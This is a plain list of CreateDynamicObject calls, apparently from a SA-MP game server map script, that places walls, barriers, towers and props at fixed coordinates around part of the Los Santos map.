	CreateDynamicObject(19911, 1537.48108, -2090.04248, 28.87140,   0.00000, 0.00000, 207.17950);
	CreateDynamicObject(19911, 1537.48108, -2090.04248, 22.47780,   0.00000, 0.00000, 207.17950);
	CreateDynamicObject(19911, 1533.45374, -2081.34399, 35.24730,   0.00000, 0.00000, 202.43948);
	CreateDynamicObject(19911, 1521.11792, -2045.07373, 28.87140,   0.00000, 0.00000, 193.19971);
	CreateDynamicObject(19911, 1533.45374, -2081.34399, 22.47780,   0.00000, 0.00000, 202.43950);
	CreateDynamicObject(19911, 1533.45374, -2081.34399, 28.87140,   0.00000, 0.00000, 202.43950);
	CreateDynamicObject(19911, 1529.82788, -2072.40698, 35.24730,   0.00000, 0.00000, 201.65950);
	CreateDynamicObject(19911, 1529.82788, -2072.40698, 28.87140,   0.00000, 0.00000, 201.65953);
	CreateDynamicObject(19911, 1526.46289, -2063.43335, 35.24730,   0.00000, 0.00000, 199.55960);
	CreateDynamicObject(19911, 1526.46289, -2063.43335, 28.87140,   0.00000, 0.00000, 199.55962);
	CreateDynamicObject(19911, 1523.53247, -2054.34351, 35.24730,   0.00000, 0.00000, 196.13960);
	CreateDynamicObject(19911, 1523.53247, -2054.34351, 28.87140,   0.00000, 0.00000, 196.13963);
	CreateDynamicObject(19911, 1519.49268, -2035.64075, 28.87140,   0.00000, 0.00000, 186.17982);
	CreateDynamicObject(19911, 1519.84778, -1914.43054, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1918.23401, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1924.03113, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1933.62854, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1943.22913, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1952.82373, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1962.43591, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1972.05627, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1981.63538, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1991.21631, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -2000.79602, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1924.03113, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1933.62854, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1943.22913, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1952.82373, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1962.43591, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1972.05627, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1981.63538, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -1991.21631, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -2000.79602, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -2010.35913, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.84778, -2019.89905, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1519.20325, -2029.41028, 28.87140,   0.00000, 0.00000, 172.31987);
	CreateDynamicObject(19911, 1521.11792, -2045.07373, 35.24730,   0.00000, 0.00000, 193.19971);
	CreateDynamicObject(19911, 1519.49268, -2035.64075, 35.24730,   0.00000, 0.00000, 186.17979);
	CreateDynamicObject(19911, 1519.20325, -2029.41028, 35.24730,   0.00000, 0.00000, 172.31990);
	CreateDynamicObject(19911, 1519.84778, -2019.89905, 35.24730,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1522.40540, -2103.26147, 35.24730,   0.00000, 0.00000, 102.65990);
	CreateDynamicObject(19911, 1512.93274, -2104.48218, 35.24730,   0.00000, 0.00000, 92.76000);
	CreateDynamicObject(19911, 1503.44104, -2103.73242, 35.24730,   0.00000, 0.00000, 78.24010);
	CreateDynamicObject(19911, 1493.93958, -2102.51318, 35.24730,   0.00000, 0.00000, 87.06020);
	CreateDynamicObject(19911, 1484.37805, -2102.39526, 35.24730,   0.00000, 0.00000, 91.44020);
	CreateDynamicObject(19911, 1474.81006, -2102.64331, 35.24730,   0.00000, 0.00000, 91.44020);
	CreateDynamicObject(19911, 1465.22729, -2102.86743, 35.24730,   0.00000, 0.00000, 91.44020);
	CreateDynamicObject(19911, 1455.64453, -2103.11060, 35.24730,   0.00000, 0.00000, 91.44020);
	CreateDynamicObject(19911, 1446.08264, -2103.83252, 35.24730,   0.00000, 0.00000, 97.26020);
	CreateDynamicObject(19911, 1436.51196, -2104.56738, 35.24730,   0.00000, 0.00000, 91.56020);
	CreateDynamicObject(19911, 1426.96533, -2105.40845, 35.24730,   0.00000, 0.00000, 98.10030);
	CreateDynamicObject(19911, 1417.53979, -2107.10376, 35.24730,   0.00000, 0.00000, 102.60030);
	CreateDynamicObject(19911, 1408.30042, -2109.75244, 35.24730,   0.00000, 0.00000, 109.14030);
	CreateDynamicObject(19911, 1399.21545, -2112.88599, 35.24730,   0.00000, 0.00000, 109.14030);
	CreateDynamicObject(19911, 1390.35522, -2116.57959, 35.24730,   0.00000, 0.00000, 116.10040);
	CreateDynamicObject(19911, 1381.91028, -2121.13940, 35.24730,   0.00000, 0.00000, 120.48040);
	CreateDynamicObject(19911, 1373.65759, -2126.02734, 35.24730,   0.00000, 0.00000, 120.48040);
	CreateDynamicObject(19911, 1365.68335, -2131.26904, 35.24730,   0.00000, 0.00000, 126.48030);
	CreateDynamicObject(19911, 1358.79565, -2137.86255, 35.24730,   0.00000, 0.00000, 141.06030);
	CreateDynamicObject(19911, 1352.76697, -2145.30811, 35.24730,   0.00000, 0.00000, 141.06030);
	CreateDynamicObject(19911, 1346.40735, -2152.48779, 35.24730,   0.00000, 0.00000, 135.66029);
	CreateDynamicObject(19911, 1339.21069, -2158.82715, 35.24730,   0.00000, 0.00000, 127.26040);
	CreateDynamicObject(19911, 1331.38428, -2164.31421, 35.24730,   0.00000, 0.00000, 122.94060);
	CreateDynamicObject(19911, 1323.18958, -2169.26514, 35.24730,   0.00000, 0.00000, 119.22060);
	CreateDynamicObject(19911, 1314.70984, -2173.76685, 35.24730,   0.00000, 0.00000, 116.70060);
	CreateDynamicObject(19911, 1305.65002, -2176.52856, 35.24730,   0.00000, 0.00000, 97.08070);
	CreateDynamicObject(19911, 1287.27258, -2181.03369, 35.24730,   0.00000, 0.00000, 118.98060);
	CreateDynamicObject(19911, 1296.18860, -2177.91577, 35.24730,   0.00000, 0.00000, 99.42060);
	CreateDynamicObject(19911, 1278.52197, -2184.89526, 35.24730,   0.00000, 0.00000, 108.48060);
	CreateDynamicObject(19911, 1270.25537, -2189.46509, 35.24730,   0.00000, 0.00000, 129.30060);
	CreateDynamicObject(19911, 1263.07324, -2195.78394, 35.24730,   0.00000, 0.00000, 133.38060);
	CreateDynamicObject(19911, 1256.20679, -2202.51416, 35.24730,   0.00000, 0.00000, 135.18050);
	CreateDynamicObject(19911, 1249.56824, -2209.42627, 35.24730,   0.00000, 0.00000, 137.16040);
	CreateDynamicObject(19911, 1243.57715, -2216.87402, 35.24730,   0.00000, 0.00000, 145.38020);
	CreateDynamicObject(19911, 1238.10754, -2224.77100, 35.24730,   0.00000, 0.00000, 145.38020);
	CreateDynamicObject(19911, 1232.67383, -2232.66235, 35.24730,   0.00000, 0.00000, 145.08020);
	CreateDynamicObject(19911, 1227.07458, -2240.42773, 35.24730,   0.00000, 0.00000, 143.34019);
	CreateDynamicObject(19911, 1222.23425, -2248.64771, 35.24730,   0.00000, 0.00000, 155.76030);
	CreateDynamicObject(19911, 1219.30884, -2257.70874, 28.87140,   0.00000, 0.00000, 168.60020);
	CreateDynamicObject(19911, 1218.38000, -2267.23535, 28.87140,   0.00000, 0.00000, 180.35989);
	CreateDynamicObject(19911, 1217.36890, -2276.72778, 28.87140,   0.00000, 0.00000, 167.39990);
	CreateDynamicObject(19911, 1214.66772, -2285.91284, 28.87140,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1211.38696, -2294.93237, 28.87140,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1208.11133, -2303.89478, 28.87140,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1204.85608, -2312.90479, 28.87140,   0.00000, 0.00000, 160.02000);
	CreateDynamicObject(19911, 1199.23181, -2320.10522, 28.87140,   0.00000, 0.00000, 124.26020);
	CreateDynamicObject(19911, 1191.30701, -2325.51245, 28.87140,   0.00000, 0.00000, 124.26020);
	CreateDynamicObject(19911, 1182.64771, -2329.13550, 28.87140,   0.00000, 0.00000, 101.16020);
	CreateDynamicObject(19911, 1174.32642, -2333.20972, 28.87140,   0.00000, 0.00000, 130.80009);
	CreateDynamicObject(19911, 1166.76563, -2339.12500, 28.87140,   0.00000, 0.00000, 125.22000);
	CreateDynamicObject(19911, 1158.23584, -2343.21753, 28.87140,   0.00000, 0.00000, 106.08000);
	CreateDynamicObject(19911, 1148.84192, -2344.47290, 28.87140,   0.00000, 0.00000, 89.34000);
	CreateDynamicObject(19911, 1139.29382, -2344.10059, 28.87140,   0.00000, 0.00000, 85.92000);
	CreateDynamicObject(19911, 1129.73169, -2343.42822, 28.87140,   0.00000, 0.00000, 85.92000);
	CreateDynamicObject(19911, 1120.90576, -2341.86523, 28.87140,   0.00000, 0.00000, 73.26000);
	CreateDynamicObject(19911, 1112.47778, -2337.60986, 28.87140,   0.00000, 0.00000, 53.22000);
	CreateDynamicObject(19911, 1105.59888, -2331.04150, 28.87140,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(19911, 1099.52405, -2323.61450, 28.87140,   0.00000, 0.00000, 39.36000);
	CreateDynamicObject(8335, 1587.56360, -1913.48901, 30.12750,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(8335, 1199.95056, -1784.19543, 16.35650,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1380, 1587.20862, -1969.09924, 49.33854,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1388, 1587.20862, -1969.09692, 112.59920,   0.00000, 0.00000, 191.88002);
	CreateDynamicObject(19911, 1519.84778, -1914.43054, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1927.78540, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1937.32776, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1946.86926, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1956.40991, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1965.93945, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1975.52246, 22.50210,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1540.20154, -1985.10999, 22.50210,   0.00000, 0.00000, 182.52003);
	CreateDynamicObject(19911, 1540.62598, -1994.72339, 22.50210,   0.00000, 0.00000, 182.64003);
	CreateDynamicObject(19911, 1541.06836, -2004.27283, 22.50210,   0.00000, 0.00000, 182.64003);
	CreateDynamicObject(19911, 1539.99866, -1918.23401, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1927.78540, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1937.32776, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1946.86926, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1956.40991, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1965.93945, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1539.99866, -1975.52246, 28.87140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(19911, 1540.20154, -1985.10999, 28.87140,   0.00000, 0.00000, 182.52000);
	CreateDynamicObject(19911, 1540.62598, -1994.72339, 28.87140,   0.00000, 0.00000, 182.64000);
	CreateDynamicObject(19911, 1541.06836, -2004.27283, 28.87140,   0.00000, 0.00000, 182.64000);
	CreateDynamicObject(19911, 1541.47510, -2013.87170, 28.87140,   0.00000, 0.00000, 182.28001);
	CreateDynamicObject(19911, 1541.95581, -2023.41907, 28.87140,   0.00000, 0.00000, 183.41997);
	CreateDynamicObject(19911, 1542.54431, -2033.00525, 28.87140,   0.00000, 0.00000, 183.41997);
	CreateDynamicObject(19911, 1543.67749, -2042.52954, 28.87140,   0.00000, 0.00000, 190.19991);
	CreateDynamicObject(19911, 1541.47510, -2013.87170, 35.24730,   0.00000, 0.00000, 182.28000);
	CreateDynamicObject(19911, 1541.95581, -2023.41907, 35.24730,   0.00000, 0.00000, 183.42000);
	CreateDynamicObject(19911, 1546.04272, -2051.79272, 28.87140,   0.00000, 0.00000, 198.23988);
	CreateDynamicObject(19911, 1549.24927, -2060.84937, 28.87140,   0.00000, 0.00000, 200.69978);
	CreateDynamicObject(19911, 1552.87708, -2069.73438, 28.87140,   0.00000, 0.00000, 203.69966);
	CreateDynamicObject(19911, 1556.89783, -2078.37769, 28.87140,   0.00000, 0.00000, 206.39961);
	CreateDynamicObject(19911, 1542.54431, -2033.00525, 35.24730,   0.00000, 0.00000, 183.42000);
	CreateDynamicObject(19911, 1543.67749, -2042.52954, 35.24730,   0.00000, 0.00000, 190.19991);
	CreateDynamicObject(19911, 1546.04272, -2051.79272, 35.24730,   0.00000, 0.00000, 198.23990);
	CreateDynamicObject(19911, 1549.24927, -2060.84937, 35.24730,   0.00000, 0.00000, 200.69980);
	CreateDynamicObject(19911, 1552.87708, -2069.73438, 35.24730,   0.00000, 0.00000, 203.69971);
	CreateDynamicObject(19911, 1556.91162, -2078.39233, 35.24730,   0.00000, 0.00000, 206.39960);
	CreateDynamicObject(19911, 1566.52075, -2087.18091, 22.52840,   0.00000, 0.00000, 309.83960);
	CreateDynamicObject(19911, 1560.70056, -2086.01880, 22.52840,   0.00000, 0.00000, 206.51961);
	CreateDynamicObject(19911, 1552.87708, -2069.73438, 22.52840,   0.00000, 0.00000, 203.69971);
	CreateDynamicObject(19911, 1556.89783, -2078.37769, 22.52840,   0.00000, 0.00000, 206.39960);
	CreateDynamicObject(19911, 1560.70056, -2086.01880, 28.87140,   0.00000, 0.00000, 206.51961);
	CreateDynamicObject(19911, 1566.52075, -2087.18091, 28.87140,   0.00000, 0.00000, 309.83960);
	CreateDynamicObject(19911, 1566.52075, -2087.18091, 16.14961,   0.00000, 0.00000, 309.83960);
	CreateDynamicObject(19911, 1573.87061, -2081.04761, 22.52840,   0.00000, 0.00000, 309.65961);
	CreateDynamicObject(19911, 1573.87061, -2081.04761, 16.14960,   0.00000, 0.00000, 309.65961);
	CreateDynamicObject(19911, 1573.87061, -2081.04761, 28.87140,   0.00000, 0.00000, 309.65961);
	CreateDynamicObject(19911, 1581.98853, -2076.10693, 22.52840,   0.00000, 0.00000, 293.03961);
	CreateDynamicObject(19911, 1581.98853, -2076.10693, 28.87140,   0.00000, 0.00000, 293.03961);
	CreateDynamicObject(19911, 1590.51135, -2071.75195, 22.52840,   0.00000, 0.00000, 300.95929);
	CreateDynamicObject(19911, 1590.51135, -2071.75195, 28.87140,   0.00000, 0.00000, 300.95929);
	CreateDynamicObject(19911, 1598.37830, -2066.22852, 22.52840,   0.00000, 0.00000, 309.05896);
	CreateDynamicObject(19911, 1598.37830, -2066.22852, 28.87140,   0.00000, 0.00000, 309.05899);
	CreateDynamicObject(19911, 1605.78333, -2060.20337, 22.52840,   0.00000, 0.00000, 309.05896);
	CreateDynamicObject(19911, 1605.78333, -2060.20337, 28.87140,   0.00000, 0.00000, 309.05899);
	CreateDynamicObject(19911, 1612.56165, -2053.43042, 22.52840,   0.00000, 0.00000, 320.81882);
	CreateDynamicObject(19911, 1612.56165, -2053.43042, 28.87140,   0.00000, 0.00000, 320.81879);
	CreateDynamicObject(19911, 1618.62622, -2045.98132, 22.52840,   0.00000, 0.00000, 320.81882);
	CreateDynamicObject(19911, 1618.62622, -2045.98132, 28.87140,   0.00000, 0.00000, 320.81879);
	CreateDynamicObject(19911, 1624.69849, -2038.51892, 22.52840,   0.00000, 0.00000, 320.81882);
	CreateDynamicObject(19911, 1630.24683, -2030.72363, 22.52840,   0.00000, 0.00000, 328.31857);
	CreateDynamicObject(19911, 1630.24683, -2030.72363, 28.87140,   0.00000, 0.00000, 328.31860);
	CreateDynamicObject(19911, 1624.69849, -2038.51892, 28.87140,   0.00000, 0.00000, 320.81879);
	CreateDynamicObject(19911, 1560.70056, -2086.01880, 35.24730,   0.00000, 0.00000, 206.51961);
	CreateDynamicObject(19911, 1566.52075, -2087.18091, 35.24730,   0.00000, 0.00000, 309.83960);
	CreateDynamicObject(19911, 1573.87061, -2081.04761, 35.24730,   0.00000, 0.00000, 309.65961);
	CreateDynamicObject(19911, 1581.98853, -2076.10693, 35.24730,   0.00000, 0.00000, 293.03961);
	CreateDynamicObject(19911, 1598.37830, -2066.22852, 35.24730,   0.00000, 0.00000, 309.05899);
	CreateDynamicObject(19911, 1590.51135, -2071.75195, 35.24730,   0.00000, 0.00000, 300.95929);
	CreateDynamicObject(19911, 1612.56165, -2053.43042, 35.24730,   0.00000, 0.00000, 320.81879);
	CreateDynamicObject(19911, 1605.78333, -2060.20337, 35.24730,   0.00000, 0.00000, 309.05899);
	CreateDynamicObject(19911, 1618.62622, -2045.98132, 35.24730,   0.00000, 0.00000, 320.81879);
	CreateDynamicObject(19911, 1624.69849, -2038.51892, 35.24730,   0.00000, 0.00000, 320.81879);
	CreateDynamicObject(19911, 1630.24683, -2030.72363, 35.24730,   0.00000, 0.00000, 328.31860);
	CreateDynamicObject(19911, 1634.13904, -2022.04138, 28.87140,   0.00000, 0.00000, 343.13821);
	CreateDynamicObject(19911, 1636.32019, -2012.74866, 28.87140,   0.00000, 0.00000, 350.33795);
	CreateDynamicObject(19911, 1637.91748, -2003.28308, 28.87140,   0.00000, 0.00000, 350.33795);
	CreateDynamicObject(19911, 1638.75464, -1993.75208, 28.87140,   0.00000, 0.00000, 359.63773);
	CreateDynamicObject(19911, 1638.51428, -1984.17505, 28.87140,   0.00000, 0.00000, 363.11758);
	CreateDynamicObject(19911, 1637.68567, -1974.61853, 28.87140,   0.00000, 0.00000, 366.77744);
	CreateDynamicObject(19911, 1636.13635, -1965.14319, 28.87140,   0.00000, 0.00000, 371.69724);
	CreateDynamicObject(19911, 1634.19812, -1955.77527, 28.87140,   0.00000, 0.00000, 371.69724);
	CreateDynamicObject(19911, 1632.40894, -1946.32544, 28.87140,   0.00000, 0.00000, 369.53732);
	CreateDynamicObject(19911, 1630.82642, -1936.87622, 28.87140,   0.00000, 0.00000, 369.53732);
	CreateDynamicObject(19911, 1629.22229, -1927.41113, 28.87140,   0.00000, 0.00000, 369.53732);
	CreateDynamicObject(19911, 1603.01172, -1913.50903, 22.52840,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1627.82117, -1919.06775, 28.87140,   0.00000, 0.00000, 369.53732);
	CreateDynamicObject(19911, 1612.64404, -1913.59094, 22.52840,   0.00000, 0.00000, 88.98000);
	CreateDynamicObject(19911, 1622.26917, -1914.02124, 28.87140,   0.00000, 0.00000, 445.91681);
	CreateDynamicObject(19911, 1622.26917, -1914.02124, 22.52840,   0.00000, 0.00000, 445.91681);
	CreateDynamicObject(19911, 1627.82117, -1919.06775, 22.52840,   0.00000, 0.00000, 369.53729);
	CreateDynamicObject(19911, 1629.22229, -1927.41113, 22.52840,   0.00000, 0.00000, 369.53729);
	CreateDynamicObject(19911, 1612.64404, -1913.59094, 28.87140,   0.00000, 0.00000, 88.98000);
	CreateDynamicObject(19911, 1603.01172, -1913.50903, 28.87140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1593.48022, -1913.51855, 22.52840,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1593.48022, -1913.51855, 28.87140,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1634.13904, -2022.04138, 35.24730,   0.00000, 0.00000, 343.13821);
	CreateDynamicObject(19911, 1636.32019, -2012.74866, 35.24730,   0.00000, 0.00000, 350.33801);
	CreateDynamicObject(19911, 1637.91748, -2003.28308, 35.24730,   0.00000, 0.00000, 350.33801);
	CreateDynamicObject(19911, 1638.75464, -1993.75208, 35.24730,   0.00000, 0.00000, 359.63770);
	CreateDynamicObject(19911, 1638.51428, -1984.17505, 35.24730,   0.00000, 0.00000, 363.11761);
	CreateDynamicObject(19911, 1637.68567, -1974.61853, 35.24730,   0.00000, 0.00000, 366.77740);
	CreateDynamicObject(19911, 1636.13635, -1965.14319, 35.24730,   0.00000, 0.00000, 371.69720);
	CreateDynamicObject(19911, 1634.19812, -1955.77527, 35.24730,   0.00000, 0.00000, 371.69720);
	CreateDynamicObject(19911, 1632.40894, -1946.32544, 35.24730,   0.00000, 0.00000, 369.53729);
	CreateDynamicObject(19911, 1630.82642, -1936.87622, 35.24730,   0.00000, 0.00000, 369.53729);
	CreateDynamicObject(19911, 1629.22229, -1927.41113, 35.24730,   0.00000, 0.00000, 369.53729);
	CreateDynamicObject(19911, 1627.82117, -1919.06775, 35.24730,   0.00000, 0.00000, 369.53729);
	CreateDynamicObject(19911, 1612.64404, -1913.59094, 35.24730,   0.00000, 0.00000, 88.98000);
	CreateDynamicObject(19911, 1622.26917, -1914.02124, 35.24730,   0.00000, 0.00000, 445.91681);
	CreateDynamicObject(19911, 1603.01172, -1913.50903, 35.24730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19911, 1593.48022, -1913.51855, 35.24730,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(8335, 1358.16321, -1892.77026, 24.86230,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(8335, 1550.06421, -1910.98669, 30.12750,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(8335, 1570.03857, -1910.98669, 30.12750,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(1380, 1166.72693, -1962.56531, 71.53343,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1388, 1166.72693, -1962.56531, 134.86008,   0.00000, 0.00000, -104.39998);
	CreateDynamicObject(1380, 1502.47937, -2008.44958, 49.33854,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1383, 1502.47937, -2008.44958, 80.56090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1388, 1502.47937, -2008.44958, 112.59920,   0.00000, 0.00000, 74.09999);
	CreateDynamicObject(1380, 1262.14441, -2136.95874, 65.27161,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1383, 1262.14441, -2136.95874, 96.49731,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1388, 1262.14441, -2136.95874, 128.59570,   0.00000, 0.00000, 19.08000);
	CreateDynamicObject(1380, 1070.94385, -2200.92114, 65.27161,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1383, 1070.94385, -2200.92114, 96.49730,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1388, 1070.94385, -2200.92114, 128.59570,   0.00000, 0.00000, 25.02001);
	CreateDynamicObject(8335, 1340.63599, -1890.27576, 24.86230,   0.00000, 0.00000, 270.00000);
	CreateDynamicObject(8661, 1209.93518, -1812.28333, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1209.92419, -1792.34436, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1209.92419, -1772.37219, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1249.88757, -1752.39612, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1209.92419, -1732.46399, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1209.92419, -1752.39612, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1249.88757, -1772.37219, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1249.88757, -1792.34436, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(8661, 1249.88757, -1812.30310, 12.55290,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(12982, 1196.31226, -1805.68689, 16.50390,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(17522, 1197.40405, -1830.78210, 14.51830,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3035, 1194.46887, -1829.56128, 14.14527,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3035, 1191.33594, -1841.39282, 13.31990,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3035, 1194.47400, -1841.39282, 13.31990,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1343, 1197.10828, -1841.31836, 13.18999,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1343, 1198.13110, -1841.31836, 13.19000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1660, 1266.98914, -1832.38245, 8.07770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1660, 1211.19055, -1832.38245, 8.07770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(9339, 1208.57544, -1829.19934, 13.25080,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(9339, 1231.78967, -1842.14063, 13.25080,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1660, 1216.44922, -1832.38245, 8.07770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1660, 1272.24170, -1832.38245, 8.07770,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(10183, 1429.97986, -1756.41370, 12.56260,   0.00000, 0.00000, 45.50000);
	CreateDynamicObject(10183, 1254.86475, -1820.25623, 12.56260,   0.00000, 0.00000, 45.50000);
	CreateDynamicObject(1686, 1226.79834, -1832.23645, 12.64960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1686, 1239.81531, -1832.23645, 12.64960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1686, 1228.63879, -1832.23645, 12.64960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1686, 1237.86792, -1832.23645, 12.64960,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(12854, 1239.39795, -1821.07104, 14.49700,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1438, 1210.05457, -1824.70557, 12.49350,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1438, 1219.14001, -1818.41516, 12.49353,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1776, 1220.48999, -1825.46045, 13.64400,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(930, 1221.37134, -1841.64648, 13.03270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(944, 1261.46423, -1841.22815, 13.32960,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(930, 1221.37134, -1841.02258, 13.03270,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16599, 1227.20081, -1822.85352, 16.89585,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(944, 1223.49951, -1841.22815, 13.32960,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(944, 1258.04211, -1841.22815, 13.32960,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(944, 1260.33362, -1841.22815, 14.77350,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2991, 1247.24194, -1818.79187, 13.20164,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2991, 1249.41895, -1818.79187, 13.20160,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2991, 1249.41895, -1818.79187, 14.45570,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2991, 1247.24194, -1818.79187, 14.45570,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2991, 1249.41895, -1822.85925, 13.20160,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(3035, 1246.62256, -1825.02466, 13.30140,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(7836, 1241.35327, -1771.53540, 18.49544,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1358, 1264.86755, -1773.63342, 13.75254,   0.00000, 0.00000, 8.10000);
	CreateDynamicObject(18249, 1261.89038, -1757.13306, 13.93877,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3073, 1255.88257, -1787.80640, 14.14694,   0.00000, 0.00000, 49.56001);
	CreateDynamicObject(3073, 1263.25354, -1784.08008, 14.14694,   0.00000, 0.00000, 119.27998);
	CreateDynamicObject(3578, 1286.70898, -1782.50952, 11.37120,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3578, 1268.56042, -1782.86780, 11.37120,   0.00000, 90.00000, -180.00000);
	CreateDynamicObject(1216, 1287.76086, -1782.70605, 13.13880,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3578, 1272.91943, -1782.89465, 15.73000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3578, 1268.56042, -1782.35535, 11.37120,   0.00000, 90.00000, -180.00000);
